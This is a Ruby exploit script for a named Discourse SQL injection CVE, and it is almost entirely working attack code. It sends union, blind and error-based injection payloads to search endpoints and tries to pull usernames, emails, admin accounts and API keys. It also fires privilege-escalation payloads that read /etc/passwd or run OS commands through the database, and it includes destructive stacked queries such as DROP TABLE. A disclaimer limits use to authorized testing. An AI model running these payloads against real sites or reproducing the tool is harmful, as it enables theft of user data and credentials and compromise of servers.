#!/usr/bin/env ruby

# CVE-2024-42364: Discourse SQL Injection via Search Parameters
# Severity: Critical
# CVSS: 9.3
#
# Description:
# Critical SQL injection vulnerability in Discourse search functionality
# allowing attackers to extract sensitive data and potentially execute commands.
#
# Affected Versions:
# - Discourse < 3.2.3
# - Discourse < 3.3.0.beta4
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'digest'

class CVE_2024_42364
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 20
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @database_type = nil
    @results = {
      cve: 'CVE-2024-42364',
      vulnerable: false,
      severity: 'Critical',
      cvss: 9.3,
      details: [],
      payloads: [],
      sqli_evidence: [],
      extracted_data: [],
      database_info: {}
    }
  end

  def run_exploit
    puts "[*] Exploiting CVE-2024-42364 against #{@target_url}"
    puts "[*] Severity: Critical (CVSS: 9.3)"
    puts "[*] Description: SQL Injection via Search Parameters"
    puts "-" * 60

    # Get initial CSRF token
    get_csrf_token

    # Detect database type
    puts "[*] Detecting database type..."
    detect_database_type

    # Test basic SQL injection
    puts "[*] Testing basic SQL injection..."
    test_basic_sqli

    # Test union-based injection
    puts "[*] Testing union-based injection..."
    test_union_sqli

    # Test boolean-based blind injection
    puts "[*] Testing boolean-based blind injection..."
    test_boolean_blind_sqli

    # Test time-based blind injection
    puts "[*] Testing time-based blind injection..."
    test_time_blind_sqli

    # Test error-based injection
    puts "[*] Testing error-based injection..."
    test_error_based_sqli

    # Extract sensitive data
    puts "[*] Attempting data extraction..."
    extract_sensitive_data

    # Test privilege escalation
    puts "[*] Testing privilege escalation..."
    test_privilege_escalation

    # Print summary
    print_summary

    # Save results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def detect_database_type
    detection_payloads = [
      # PostgreSQL detection
      {
        payload: "' AND version()::text LIKE '%PostgreSQL%' --",
        db_type: 'postgresql',
        description: 'PostgreSQL version detection'
      },
      
      # MySQL detection
      {
        payload: "' AND @@version LIKE '%mysql%' --",
        db_type: 'mysql',
        description: 'MySQL version detection'
      },
      
      # SQLite detection
      {
        payload: "' AND sqlite_version() IS NOT NULL --",
        db_type: 'sqlite',
        description: 'SQLite version detection'
      },
      
      # Generic SQL detection
      {
        payload: "' AND 1=1 --",
        db_type: 'generic',
        description: 'Generic SQL injection test'
      }
    ]

    detection_payloads.each do |payload_data|
      if test_search_injection(payload_data[:payload])
        @database_type = payload_data[:db_type]
        @results[:database_info][:type] = @database_type
        puts "[+] Database type detected: #{@database_type}"
        break
      end
      sleep(0.5)
    end
  end

  def test_basic_sqli
    basic_payloads = [
      # Simple quote tests
      "'",
      "''",
      "\"'",
      "'\"",
      
      # Comment injection
      "' --",
      "' #",
      "' /*",
      
      # Logic manipulation
      "' OR '1'='1",
      "' OR 1=1 --",
      "' OR 'a'='a",
      "' AND '1'='2",
      
      # Parentheses bypass
      "') OR ('1'='1",
      "')) OR (('1'='1",
      "'))) OR ((('1'='1",
      
      # Encoded payloads
      "%27%20OR%20%271%27%3D%271",
      "%22%20OR%20%221%22%3D%221",
      
      # Null byte injection
      "'%00",
      "'\x00",
      
      # Stacked queries
      "'; SELECT 1 --",
      "'; DROP TABLE test --",
      "'; INSERT INTO test VALUES(1) --"
    ]

    basic_payloads.each do |payload|
      if test_search_injection(payload)
        @results[:vulnerable] = true
        @results[:details] << "Basic SQL injection: #{payload}"
        @results[:payloads] << payload
        
        puts "[+] Basic SQL injection detected: #{payload}"
      end
      sleep(0.3)
    end
  end

  def test_union_sqli
    # Determine number of columns first
    column_count = detect_column_count
    return unless column_count
    
    union_payloads = generate_union_payloads(column_count)
    
    union_payloads.each do |payload_data|
      response = test_search_injection_with_response(payload_data[:payload])
      
      if response && detect_union_success(response, payload_data)
        @results[:vulnerable] = true
        @results[:details] << "Union-based injection: #{payload_data[:description]}"
        @results[:payloads] << payload_data[:payload]
        @results[:sqli_evidence] << {
          type: 'union',
          payload: payload_data[:payload],
          response: response.body[0..500]
        }
        
        puts "[+] Union injection successful: #{payload_data[:description]}"
      end
      sleep(0.5)
    end
  end

  def detect_column_count
    (1..20).each do |count|
      null_columns = Array.new(count, 'NULL').join(',')
      payload = "' UNION SELECT #{null_columns} --"
      
      response = test_search_injection_with_response(payload)
      
      if response && !response.body.include?('error') && response.code.to_i == 200
        puts "[+] Column count detected: #{count}"
        return count
      end
      sleep(0.2)
    end
    
    nil
  end

  def generate_union_payloads(column_count)
    payloads = []
    
    # Basic union payload
    null_columns = Array.new(column_count, 'NULL').join(',')
    payloads << {
      payload: "' UNION SELECT #{null_columns} --",
      description: 'Basic union injection',
      expected: nil
    }
    
    # Database version extraction
    version_columns = Array.new(column_count, 'NULL')
    case @database_type
    when 'postgresql'
      version_columns[0] = 'version()'
      payloads << {
        payload: "' UNION SELECT #{version_columns.join(',')} --",
        description: 'PostgreSQL version extraction',
        expected: 'PostgreSQL'
      }
    when 'mysql'
      version_columns[0] = '@@version'
      payloads << {
        payload: "' UNION SELECT #{version_columns.join(',')} --",
        description: 'MySQL version extraction',
        expected: 'mysql'
      }
    when 'sqlite'
      version_columns[0] = 'sqlite_version()'
      payloads << {
        payload: "' UNION SELECT #{version_columns.join(',')} --",
        description: 'SQLite version extraction',
        expected: 'sqlite'
      }
    end
    
    # Current user extraction
    user_columns = Array.new(column_count, 'NULL')
    case @database_type
    when 'postgresql'
      user_columns[0] = 'current_user'
      payloads << {
        payload: "' UNION SELECT #{user_columns.join(',')} --",
        description: 'PostgreSQL current user',
        expected: nil
      }
    when 'mysql'
      user_columns[0] = 'user()'
      payloads << {
        payload: "' UNION SELECT #{user_columns.join(',')} --",
        description: 'MySQL current user',
        expected: nil
      }
    end
    
    # Database name extraction
    db_columns = Array.new(column_count, 'NULL')
    case @database_type
    when 'postgresql'
      db_columns[0] = 'current_database()'
      payloads << {
        payload: "' UNION SELECT #{db_columns.join(',')} --",
        description: 'PostgreSQL database name',
        expected: nil
      }
    when 'mysql'
      db_columns[0] = 'database()'
      payloads << {
        payload: "' UNION SELECT #{db_columns.join(',')} --",
        description: 'MySQL database name',
        expected: nil
      }
    end
    
    payloads
  end

  def test_boolean_blind_sqli
    boolean_payloads = [
      # True conditions
      {
        payload: "' AND 1=1 --",
        expected_result: true,
        description: 'Boolean true condition'
      },
      {
        payload: "' AND 'a'='a' --",
        expected_result: true,
        description: 'Boolean string comparison true'
      },
      
      # False conditions
      {
        payload: "' AND 1=2 --",
        expected_result: false,
        description: 'Boolean false condition'
      },
      {
        payload: "' AND 'a'='b' --",
        expected_result: false,
        description: 'Boolean string comparison false'
      }
    ]

    # Get baseline response
    baseline_response = test_search_injection_with_response("test")
    return unless baseline_response
    
    baseline_length = baseline_response.body.length
    
    boolean_payloads.each do |payload_data|
      response = test_search_injection_with_response(payload_data[:payload])
      
      if response && detect_boolean_difference(response, baseline_response, payload_data[:expected_result])
        @results[:vulnerable] = true
        @results[:details] << "Boolean blind injection: #{payload_data[:description]}"
        @results[:payloads] << payload_data[:payload]
        @results[:sqli_evidence] << {
          type: 'boolean_blind',
          payload: payload_data[:payload],
          baseline_length: baseline_length,
          response_length: response.body.length
        }
        
        puts "[+] Boolean blind injection: #{payload_data[:description]}"
      end
      sleep(0.5)
    end
  end

  def test_time_blind_sqli
    time_payloads = generate_time_based_payloads
    
    time_payloads.each do |payload_data|
      start_time = Time.now
      response = test_search_injection_with_response(payload_data[:payload])
      end_time = Time.now
      
      response_time = end_time - start_time
      
      if response_time >= payload_data[:expected_delay]
        @results[:vulnerable] = true
        @results[:details] << "Time-based blind injection: #{payload_data[:description]}"
        @results[:payloads] << payload_data[:payload]
        @results[:sqli_evidence] << {
          type: 'time_blind',
          payload: payload_data[:payload],
          response_time: response_time,
          expected_delay: payload_data[:expected_delay]
        }
        
        puts "[+] Time-based injection (#{response_time}s): #{payload_data[:description]}"
      end
      sleep(1)
    end
  end

  def generate_time_based_payloads
    payloads = []
    
    case @database_type
    when 'postgresql'
      payloads << {
        payload: "' AND pg_sleep(5) --",
        expected_delay: 4.5,
        description: 'PostgreSQL pg_sleep delay'
      }
      payloads << {
        payload: "'; SELECT pg_sleep(5) --",
        expected_delay: 4.5,
        description: 'PostgreSQL stacked query delay'
      }
    when 'mysql'
      payloads << {
        payload: "' AND SLEEP(5) --",
        expected_delay: 4.5,
        description: 'MySQL SLEEP delay'
      }
      payloads << {
        payload: "' AND BENCHMARK(5000000,MD5(1)) --",
        expected_delay: 2.0,
        description: 'MySQL BENCHMARK delay'
      }
    when 'sqlite'
      payloads << {
        payload: "' AND (SELECT COUNT(*) FROM (SELECT * FROM sqlite_master UNION SELECT * FROM sqlite_master UNION SELECT * FROM sqlite_master)) --",
        expected_delay: 1.0,
        description: 'SQLite heavy query delay'
      }
    else
      # Generic time-based payloads
      payloads << {
        payload: "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        expected_delay: 1.0,
        description: 'Generic heavy query delay'
      }
    end
    
    payloads
  end

  def test_error_based_sqli
    error_payloads = generate_error_based_payloads
    
    error_payloads.each do |payload_data|
      response = test_search_injection_with_response(payload_data[:payload])
      
      if response && detect_sql_error(response, payload_data)
        @results[:vulnerable] = true
        @results[:details] << "Error-based injection: #{payload_data[:description]}"
        @results[:payloads] << payload_data[:payload]
        @results[:sqli_evidence] << {
          type: 'error_based',
          payload: payload_data[:payload],
          error_message: extract_error_message(response)
        }
        
        puts "[+] Error-based injection: #{payload_data[:description]}"
      end
      sleep(0.5)
    end
  end

  def generate_error_based_payloads
    payloads = []
    
    case @database_type
    when 'postgresql'
      payloads << {
        payload: "' AND CAST((SELECT version()) AS int) --",
        description: 'PostgreSQL CAST error with version',
        expected_error: 'invalid input syntax'
      }
      payloads << {
        payload: "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END) --",
        description: 'PostgreSQL division by zero',
        expected_error: 'division by zero'
      }
    when 'mysql'
      payloads << {
        payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --",
        description: 'MySQL EXTRACTVALUE error',
        expected_error: 'XPATH syntax error'
      }
      payloads << {
        payload: "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        description: 'MySQL duplicate entry error',
        expected_error: 'Duplicate entry'
      }
    when 'sqlite'
      payloads << {
        payload: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END) --",
        description: 'SQLite division by zero',
        expected_error: 'division by zero'
      }
    end
    
    # Generic error payloads
    payloads << {
      payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      description: 'Generic duplicate entry error',
      expected_error: 'Duplicate entry'
    }
    
    payloads
  end

  def extract_sensitive_data
    return unless @results[:vulnerable]
    
    extraction_queries = generate_extraction_queries
    
    extraction_queries.each do |query_data|
      extracted_data = execute_extraction_query(query_data)
      
      if extracted_data
        @results[:extracted_data] << {
          type: query_data[:type],
          description: query_data[:description],
          data: extracted_data
        }
        
        puts "[+] Data extracted: #{query_data[:description]}"
      end
      sleep(1)
    end
  end

  def generate_extraction_queries
    queries = []
    
    case @database_type
    when 'postgresql'
      queries << {
        type: 'users',
        description: 'Discourse users table',
        query: "SELECT username,email FROM users LIMIT 5"
      }
      queries << {
        type: 'admin_users',
        description: 'Admin users',
        query: "SELECT username,email FROM users WHERE admin = true LIMIT 5"
      }
      queries << {
        type: 'api_keys',
        description: 'API keys',
        query: "SELECT key,user_id FROM api_keys LIMIT 5"
      }
    when 'mysql'
      queries << {
        type: 'users',
        description: 'Discourse users table',
        query: "SELECT username,email FROM users LIMIT 5"
      }
      queries << {
        type: 'admin_users',
        description: 'Admin users',
        query: "SELECT username,email FROM users WHERE admin = 1 LIMIT 5"
      }
    end
    
    # Generic queries
    queries << {
      type: 'tables',
      description: 'Database tables',
      query: "SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 10"
    }
    
    queries
  end

  def execute_extraction_query(query_data)
    # Use union-based extraction if available
    if @results[:sqli_evidence].any? { |e| e[:type] == 'union' }
      return execute_union_extraction(query_data[:query])
    end
    
    # Use boolean-based extraction
    if @results[:sqli_evidence].any? { |e| e[:type] == 'boolean_blind' }
      return execute_boolean_extraction(query_data[:query])
    end
    
    nil
  end

  def execute_union_extraction(query)
    # Simplified union-based extraction
    column_count = detect_column_count
    return nil unless column_count
    
    null_columns = Array.new(column_count, 'NULL')
    null_columns[0] = "(#{query})"
    
    payload = "' UNION SELECT #{null_columns.join(',')} --"
    response = test_search_injection_with_response(payload)
    
    return extract_data_from_response(response) if response
    nil
  end

  def execute_boolean_extraction(query)
    # Simplified boolean-based extraction (extract first character)
    (32..126).each do |ascii_val|
      char = ascii_val.chr
      payload = "' AND ASCII(SUBSTRING((#{query}),1,1))=#{ascii_val} --"
      
      response = test_search_injection_with_response(payload)
      baseline_response = test_search_injection_with_response("test")
      
      if response && baseline_response && detect_boolean_difference(response, baseline_response, true)
        return char
      end
      sleep(0.1)
    end
    
    nil
  end

  def test_privilege_escalation
    return unless @results[:vulnerable]
    
    escalation_payloads = [
      # File operations
      "' UNION SELECT load_file('/etc/passwd') --",
      "'; SELECT * INTO OUTFILE '/tmp/test.txt' FROM users --",
      
      # Command execution (MySQL)
      "'; SELECT sys_exec('id') --",
      "'; SELECT sys_eval('whoami') --",
      
      # PostgreSQL command execution
      "'; COPY (SELECT '') TO PROGRAM 'id' --",
      "'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT --"
    ]

    escalation_payloads.each do |payload|
      response = test_search_injection_with_response(payload)
      
      if response && detect_privilege_escalation(response)
        @results[:details] << "Privilege escalation possible: #{payload}"
        @results[:payloads] << payload
        
        puts "[+] Privilege escalation detected: #{payload[0..50]}..."
      end
      sleep(1)
    end
  end

  # Helper methods
  def test_search_injection(payload)
    response = test_search_injection_with_response(payload)
    return false unless response
    
    # Check for SQL error indicators
    sql_errors = [
      'sql syntax',
      'mysql_fetch',
      'postgresql error',
      'sqlite error',
      'syntax error',
      'unexpected end of sql command',
      'unterminated quoted string',
      'quoted string not properly terminated'
    ]
    
    sql_errors.any? { |error| response.body.downcase.include?(error) }
  end

  def test_search_injection_with_response(payload)
    search_endpoints = [
      '/search',
      '/search.json',
      '/search/query',
      '/c/search',
      '/tags/search'
    ]

    search_endpoints.each do |endpoint|
      begin
        # Test GET request
        url = "#{@target_url}#{endpoint}?q=#{URI.encode_www_form_component(payload)}"
        uri = URI(url)
        response = make_request(uri)
        
        return response if response
        
        # Test POST request
        uri = URI("#{@target_url}#{endpoint}")
        body = URI.encode_www_form({ 'q' => payload })
        headers = {
          'Content-Type' => 'application/x-www-form-urlencoded',
          'X-CSRF-Token' => @csrf_token
        }
        
        response = make_request(uri, 'POST', body, headers)
        return response if response
        
      rescue => e
        next
      end
      
      sleep(0.2)
    end
    
    nil
  end

  def detect_union_success(response, payload_data)
    return false unless response
    
    if payload_data[:expected]
      return response.body.downcase.include?(payload_data[:expected].downcase)
    end
    
    # Check for successful union indicators
    union_indicators = [
      'null',
      'version',
      'database',
      'user'
    ]
    
    union_indicators.any? { |indicator| response.body.downcase.include?(indicator) }
  end

  def detect_boolean_difference(response, baseline, expected_true)
    return false unless response && baseline
    
    length_diff = (response.body.length - baseline.body.length).abs
    
    if expected_true
      # True condition should return similar or more results
      length_diff < 100 || response.body.length > baseline.body.length
    else
      # False condition should return fewer results
      response.body.length < baseline.body.length || length_diff > 100
    end
  end

  def detect_sql_error(response, payload_data)
    return false unless response
    
    if payload_data[:expected_error]
      return response.body.downcase.include?(payload_data[:expected_error].downcase)
    end
    
    error_indicators = [
      'sql',
      'syntax',
      'error',
      'exception',
      'warning'
    ]
    
    error_indicators.any? { |indicator| response.body.downcase.include?(indicator) }
  end

  def extract_error_message(response)
    # Extract error message from response
    error_patterns = [
      /error[^\n]*\n/i,
      /exception[^\n]*\n/i,
      /warning[^\n]*\n/i
    ]
    
    error_patterns.each do |pattern|
      match = response.body.match(pattern)
      return match[0].strip if match
    end
    
    response.body[0..200]
  end

  def extract_data_from_response(response)
    # Simple data extraction from response
    return nil unless response
    
    # Look for structured data patterns
    data_patterns = [
      /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/,  # Email
      /[a-zA-Z][a-zA-Z0-9_]{2,}/,  # Username
      /[a-f0-9]{32,}/  # Hash
    ]
    
    extracted = []
    data_patterns.each do |pattern|
      matches = response.body.scan(pattern)
      extracted.concat(matches.flatten.uniq)
    end
    
    extracted.empty? ? nil : extracted
  end

  def detect_privilege_escalation(response)
    return false unless response
    
    escalation_indicators = [
      'uid=',
      'gid=',
      'root:',
      '/bin/bash',
      'command executed',
      'file created'
    ]
    
    escalation_indicators.any? { |indicator| response.body.include?(indicator) }
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    begin
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
      http.read_timeout = @timeout
      
      request = case method.upcase
                when 'GET'
                  Net::HTTP::Get.new(uri.request_uri)
                when 'POST'
                  Net::HTTP::Post.new(uri.request_uri)
                when 'PUT'
                  Net::HTTP::Put.new(uri.request_uri)
                end
      
      request['User-Agent'] = @user_agent
      
      # Add session cookies
      if @session_cookies.any?
        cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
        request['Cookie'] = cookie_string
      end
      
      # Add custom headers
      headers.each { |k, v| request[k] = v }
      
      request.body = body if body
      
      http.request(request)
    rescue => e
      puts "[!] Request error: #{e.message}"
      nil
    end
  end

  def print_summary
    puts "\n" + "=" * 60
    puts "CVE-2024-42364 Exploit Summary"
    puts "=" * 60
    
    if @results[:vulnerable]
      puts "[+] Target is VULNERABLE to CVE-2024-42364"
      puts "[+] Database type: #{@database_type || 'Unknown'}"
      puts "[+] SQL injection evidence: #{@results[:sqli_evidence].length} items"
      puts "[+] Data extracted: #{@results[:extracted_data].length} items"
    else
      puts "[-] Target appears to be patched"
    end
    
    puts "[*] Total tests performed: #{@results[:details].length}"
    puts "[*] Payloads tested: #{@results[:payloads].length}"
  end

  def save_results
    begin
      @results[:scan_time] = Time.now.to_f
      @results[:target] = @target_url
      
      File.write('/tmp/cve_2024_42364_results.json', @results.to_json)
      puts "[*] Results saved to /tmp/cve_2024_42364_results.json"
    rescue => e
      puts "[!] Error saving results: #{e.message}"
    end
  end
end

# Main execution
if __FILE__ == $0
  if ARGV.length < 1
    puts "Usage: #{$0} <target_url> [proxy]"
    puts "Example: #{$0} https://discourse.example.com"
    exit 1
  end
  
  target_url = ARGV[0]
  proxy = ARGV[1] if ARGV.length > 1
  
  options = {}
  options[:proxy] = proxy if proxy
  
  exploit = CVE_2024_42364.new(target_url, options)
  results = exploit.run_exploit
  
  puts "\n[*] Exploit completed. Results:"
  puts results.to_json
end
